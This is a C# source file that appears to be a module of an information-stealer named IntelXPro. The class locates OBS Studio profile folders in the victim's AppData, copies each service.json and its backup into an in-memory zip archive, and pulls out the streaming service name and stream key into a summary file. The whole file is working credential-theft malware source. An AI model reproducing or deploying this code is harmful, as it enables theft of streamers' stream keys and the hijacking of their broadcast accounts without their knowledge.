using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Obs : ITarget
    {
        private static readonly Regex SettingsRe = new Regex("\"settings\"\\s*:\\s*\\{(?<s>.*?)\\}", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);

        private static readonly Regex ServiceRe = new Regex("\"service\"\\s*:\\s*\"(?<v>[^\"]*)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);

        private static readonly Regex KeyRe = new Regex("\"key\"\\s*:\\s*\"(?<v>[^\"]*)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);

        public void Collect(InMemoryZip zip, Counter counter)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "obs-studio", "basic", "profiles");
            if (!Directory.Exists(path))
            {
                return;
            }
            string[] jsonFiles = new string[2] { "service.json", "service.json.bak" };
            ConcurrentBag<string> infoLines = new ConcurrentBag<string>();
            string[] directories = Directory.GetDirectories(path);
            if (directories.Length == 0)
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "OBS";
            Parallel.ForEach(directories, delegate (string profileDir)
            {
                string text2 = Path.GetFileName(profileDir) ?? profileDir;
                string[] array = jsonFiles;
                foreach (string text3 in array)
                {
                    string text4 = Path.Combine(profileDir, text3);
                    if (File.Exists(text4))
                    {
                        string text5 = File.ReadAllText(text4, Encoding.UTF8);
                        string text6 = "OBS\\" + text2 + "\\" + text3;
                        zip.AddFile(text6, File.ReadAllBytes(text4));
                        counterApplications.Files.Add(text4 + " => " + text6);
                        Match match = SettingsRe.Match(text5);
                        string input = (match.Success ? match.Groups["s"].Value : text5);
                        string value = ServiceRe.Match(input).Groups["v"].Value;
                        string value2 = KeyRe.Match(input).Groups["v"].Value;
                        if (!string.IsNullOrEmpty(value) || !string.IsNullOrEmpty(value2))
                        {
                            infoLines.Add("Profile:" + text2 + " | File:" + text3 + " | Service:" + value + " | Key:" + value2);
                        }
                    }
                }
            });
            if (infoLines.Any())
            {
                string text = "OBS\\OBS_ServiceKeys.txt";
                zip.AddTextFile(text, string.Join(Environment.NewLine, infoLines));
                counterApplications.Files.Add(text);
            }
            if (counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
